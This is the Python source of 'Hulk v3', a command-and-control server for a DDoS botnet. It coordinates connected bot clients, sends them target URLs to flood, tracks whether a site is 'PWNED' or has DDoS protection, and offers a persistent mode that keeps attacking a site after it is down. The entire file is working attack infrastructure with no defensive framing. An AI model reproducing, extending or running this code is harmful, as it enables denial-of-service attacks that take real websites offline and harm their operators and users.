#!/usr/bin/env python3

"""
Hulk v3

The Hulk server which is used to perform DDoS attacks via coordinated attacks.
Hulk Clients/Bots can connect to the Hulk Server to receive the instructions.
"""


import argparse
import platform
import queue
import re
import select
import socket
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse

try:  # When running directly.
    from enums import (
        ServerCommands, ClientCommands,
        StatusCodes, ErrorMessages
    )
    from logger import (
        LOGGER, WinNamedPipeHandler,
        UnixNamedPipeHandler
    )
except ImportError:  # When imported into launcher.
    from server.enums import (
        ServerCommands, ClientCommands,
        StatusCodes, ErrorMessages
    )
    from server.logger import (
        LOGGER, WinNamedPipeHandler,
        UnixNamedPipeHandler
    )


# pylint: disable=too-many-instance-attributes, too-few-public-methods
class HulkServer:
    """
    The Hulk Server.

    :param target: The target URL to attack.
    :type target: str
    :param port: The port to connect to.
    :type port: Optional[int]
    :param persistent: Whether or not to keep attacking the target.
    :type persistent: Optional[bool]
    :param max_missiles: The maximum number of missiles to attack the target.
    :type max_missiles: Optional[int]
    """
    def __init__(
        self, target: str,
        port: Optional[int] = 6666,
        persistent: Optional[bool] = False,
        max_missiles: Optional[int] = 100
    ):
        if re.search(r'http[s]?\://([^/]*)/?.*', target):
            self.target = target
        else:
            raise ValueError("Invalid URL.")
        self.port: int = port
        self.persistent: bool = persistent
        self.max_missiles: int = max_missiles
        self.server: socket.socket = self._get_socket()
        self.inputs: List[socket.socket] = [self.server]
        self.outputs: List[socket.socket] = []
        self.message_queues: Dict[socket.socket, queue.Queue] = {}
        self.on_standby: List[socket.socket] = []
        self.address_cache: Dict[socket.socket, Tuple[str, int]] = {}
        self.completed: bool = False
        self._client_pattern: re.Pattern = re.compile(r'<(.+?)>')

    def _get_socket(self) -> socket.socket:
        """
        Creates a socket server and binds it to the port.
        :return: The socket server.
        :rtype: socket.socket
        """
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setblocking(0)
        server_socket.bind(('', self.port))
        server_socket.listen(self.max_missiles)
        return server_socket

    def launch(self):
        """
        Launches the Hulk Server.
        """
        try:
            while self.inputs:
                readable, writable, exceptional = select.select(
                    self.inputs, self.outputs, self.inputs
                )
                self._handle_readables(readable)
                self._handle_writables(writable)
                self._handle_exceptionals(exceptional)
        except KeyboardInterrupt:
            self.target = self._get_new_target()
            self.launch()

    def _get_new_target(self):
        """
        Gets a new target from the user.

        :return: The new target.
        :rtype: str
        """
        target = input("Enter the next url (or 'quit' to exit):\n")
        if target.lower() in {
            "q", "quit", "exit"
        }:
            self.inputs = []
            self.outputs = []
            self.message_queues = {}
            self.server.close()
            return None
        self.completed = False
        return target

    def _handle_readables(self, readable: List[socket.socket]):
        """
        Handles the readable sockets.
        :param readable: The list of readable sockets.
        :type readable: List[socket.socket]
        """
        for elem in readable:
            if elem is self.server:
                self._accept_connections(elem)
            else:
                try:
                    self._command(elem)
                except Exception as exp:  # pylint: disable=broad-except
                    if isinstance(exp, (ConnectionAbortedError, socket.error)):
                        hostname, port = self.address_cache.pop(elem)
                        error_msg = str(ErrorMessages.CONNECTION_ABORTED)
                        LOGGER.error(
                            'Connection Error <%s> by [%s:%d]',
                            error_msg, hostname, port
                        )
                    else:
                        LOGGER.error(exp)
                    if elem in self.outputs:
                        self.outputs.remove(elem)
                    self.inputs.remove(elem)
                    self.message_queues.pop(elem, None)

    def _accept_connections(self, server_elem: socket.socket):
        """
        Accepts connections from the server.
        :param server_elem: The server socket.
        :type server_elem: socket.socket
        """
        connection, addr = server_elem.accept()
        ip_addr, port = addr
        hostname = socket.gethostbyaddr(ip_addr)[0]
        LOGGER.info(
            "Established connection with Missile [%s:%d]",
            hostname, port
        )
        connection.setblocking(0)
        self.inputs.append(connection)
        self.message_queues[connection] = queue.Queue()
        self.address_cache[connection] = (hostname, port)

    def _command(self, bot: socket.socket):
        """
        Command the connected bot.

        :param bot: The bot which connected to the server.
        :type bot: socket.socket
        """
        message = bot.recv(1024).decode()
        commands = self._client_pattern.findall(message)
        if not commands:
            return
        for cmd in commands:
            self._handle_command(bot, cmd)

    def _handle_command(self, bot: socket.socket, data: str):
        ip_addr, port = bot.getpeername()
        hostname = socket.gethostbyaddr(ip_addr)[0]
        if int(data) in {
            cmd.value
            for cmd in ClientCommands
        }:
            msg_type = "Data"
            data_name = str(ClientCommands(int(data)))
        else:
            msg_type = "Status"
            data_name = str(StatusCodes(int(data)))
        LOGGER.incoming(
            "Received %s <%s> from [%s:%d]",
            msg_type, data_name, hostname, port
        )
        if (
            int(data) == ClientCommands.STANDBY
            and bot not in self.on_standby
        ):
            self.on_standby.append(bot)
            # First element in inputs is the server. So we reduce length by 1.
            if len(self.on_standby) >= (len(self.inputs) - 1):
                self._fresh_start()
        elif self.completed:
            self._stop_all_bots(terminate=(not self.persistent))
        # Bot finished attacks.
        elif int(data) not in {
            cmd.value
            for cmd in ClientCommands
        }:
            self._on_status_received(bot, data)
        elif int(data) == ClientCommands.KILLED:
            LOGGER.info(
                "Disconnected from [%s:%d]",
                hostname, port
            )
            del self.message_queues[bot]
            if bot in self.outputs:
                self.outputs.remove(bot)
            if bot in self.inputs:
                self.inputs.remove(bot)
            bot.close()
            return
        elif int(data) != ClientCommands.READ_STATUS and self.target:
            self.message_queues[bot].put(str(ServerCommands.READ_TARGET))
            self.message_queues[bot].put(self.target)
        if bot not in self.outputs:
            self.outputs.append(bot)

    def _fresh_start(self):
        """
        Starts a new attack.
        """
        self.target = self._get_new_target()
        for bot_ in self.on_standby:
            if bot_ not in self.outputs:
                self.outputs.append(bot_)
            if bot_ not in self.inputs:
                self.inputs.append(bot_)
            if bot_ not in self.message_queues:
                self.message_queues[bot_] = queue.Queue()
            self.message_queues[bot_].put(str(ServerCommands.READ_TARGET))
            self.message_queues[bot_].put(self.target)
        self.on_standby = []

    def _on_status_received(self, bot: socket.socket, data: str):
        """
        Called when the status of the bot is received.

        :param bot: The bot which sent the status.
        :type bot: socket.socket
        :param data: The status message.
        :type data: str
        """
        status = int(data)
        if status >= StatusCodes.PWNED:
            self.completed = True
            LOGGER.success(
                "Succesfully DDoSed %s", self.target
            )
            if not self.persistent:
                self._stop_all_bots()
            else:
                # Keep attacking the target to keep it down.
                self.message_queues[bot].put(str(ServerCommands.READ_TARGET))
                self.message_queues[bot].put(self.target)
        elif status == StatusCodes.ANTI_DDOS:
            LOGGER.error(
                "The entered URL has DDoS protection, please retry."
            )
            self._stop_all_bots()
        elif status == StatusCodes.NOT_FOUND:
            LOGGER.error(
                "The entered URL is invalid, please retry."
            )
            self._stop_all_bots()
        elif status in {StatusCodes.FORBIDDEN, StatusCodes.CONNECTION_FAILURE}:
            LOGGER.error(
                "The entered URL is not accessible, please retry."
            )
            self._stop_all_bots()
        else:
            self.message_queues[bot].put(str(ServerCommands.READ_TARGET))
            self.message_queues[bot].put(self.target)

    def _stop_all_bots(self, terminate: bool = False):
        """
        Stops all the bots and cleanup queues.

        :param terminate: Whether to terminate the bots.
        :type terminate: bool
        """
        for bot, que in self.message_queues.items():
            with que.mutex:
                que.queue.clear()
            if bot not in self.on_standby:
                que.put(str(
                    ServerCommands.TERMINATE if terminate
                    else ServerCommands.STOP
                ))
        self.target = None

    def _handle_writables(self, writable: List[socket.socket]):
        """
        Handles the writable sockets.
        :param writable: The list of writable sockets.
        :type writable: List[socket.socket]
        """
        for elem in writable:
            try:
                ip_addr, port = elem.getpeername()
                hostname = socket.gethostbyaddr(ip_addr)[0]
                if elem not in self.message_queues:
                    continue
                next_msg = self.message_queues[elem].get_nowait()
            except queue.Empty:
                if elem in self.outputs:
                    self.outputs.remove(elem)
            else:
                if next_msg is None:
                    continue
                try:
                    elem.sendall(next_msg.encode())
                    msg_type = (
                        "Target"
                        if next_msg == self.target
                        else "Command"
                    )
                    LOGGER.outgoing(
                        "Sending %s <%s> to [%s:%d]",
                        msg_type, next_msg, hostname, port
                    )
                except (
                    ConnectionAbortedError,
                    ConnectionRefusedError,
                    ConnectionResetError,
                    socket.error
                ) as exp:
                    error_msg = exp
                    if isinstance(exp, ConnectionRefusedError):
                        error_msg = ErrorMessages.CONNECTION_REFUSED
                    elif isinstance(exp, ConnectionResetError):
                        error_msg = ErrorMessages.CONNECTION_RESET
                    elif isinstance(
                        exp,
                        (ConnectionAbortedError, socket.error)
                    ):
                        error_msg = ErrorMessages.CONNECTION_ABORTED
                    LOGGER.error(
                        'Connection Error <%s> by [%s:%d]',
                        error_msg, hostname, port
                    )
                    self.inputs.remove(elem)
                    self.message_queues.pop(elem, None)
                    self.outputs.remove(elem)
                except Exception as exp:  # pylint: disable=broad-except
                    LOGGER.error(
                        'Unknown Error %s by [%s:%d]',
                        exp, hostname, port
                    )
                    self.outputs.remove(elem)

    def _handle_exceptionals(self, exceptional: List[socket.socket]):
        """
        Handles the exceptional sockets.
        :param exceptional: The list of exceptional sockets.
        :type exceptional: List[socket.socket]
        """
        for elem in exceptional:
            self.inputs.remove(elem)
            if elem in self.outputs:
                self.outputs.remove(elem)
            elem.close()
            self.message_queues.pop(elem, None)


def modify_parser(parser: argparse.ArgumentParser):
    """
    Useful for exposing the parser modification to external modules.

    :param parser: The parser to modify.
    :type parser: argparse.ArgumentParser
    """
    def valid_url(arg: argparse.Action):
        """
        Checks if the URL is valid.
        :param arg: The URL to check.
        :type arg: argparse.Action
        :return: The URL if valid, else None.
        :rtype: argparse.Action
        """
        result = urlparse(arg)
        if not all([
            result.scheme and result.scheme in {'http', 'https'},
            result.path or result.netloc
        ]):
            raise argparse.ArgumentTypeError(
                "The entered URL is invalid.\n"
                "Valid Formats: https://www.example.com "
                "or http://www.example.com"
            )
        return arg

    parser.add_argument(
        "target",
        help="The target url.",
        type=valid_url
    )
    parser.add_argument(
        "-p", "--port",
        help="The port to bind the server to.",
        type=int,
        default=6666
    )
    parser.add_argument(
        "-m", '--max_missiles',
        help="The maximum number of missiles to connect to.",
        type=int,
        default=100
    )
    parser.add_argument(
        "--persistent",
        help="Continue attacks after target is down.",
        action="store_false"
    )
    parser.add_argument(
        '--gui',
        help="Run with GUI.",
        action="store_true"
    )


if __name__ == "__main__":
    argparser = argparse.ArgumentParser(description="Hulk Server")
    modify_parser(argparser)
    args = argparser.parse_args()

    if args.gui:
        if platform.system() == "Windows":
            LOGGER.addHandler(WinNamedPipeHandler(wait_for_pipe=True))
        else:
            LOGGER.addHandler(UnixNamedPipeHandler(wait_for_pipe=True))

    # pylint: disable=duplicate-code
    LOGGER.success("Hulk Server is Live!")
    server = HulkServer(
        args.target, args.port,
        args.persistent,
        args.max_missiles
    )
    server.launch()
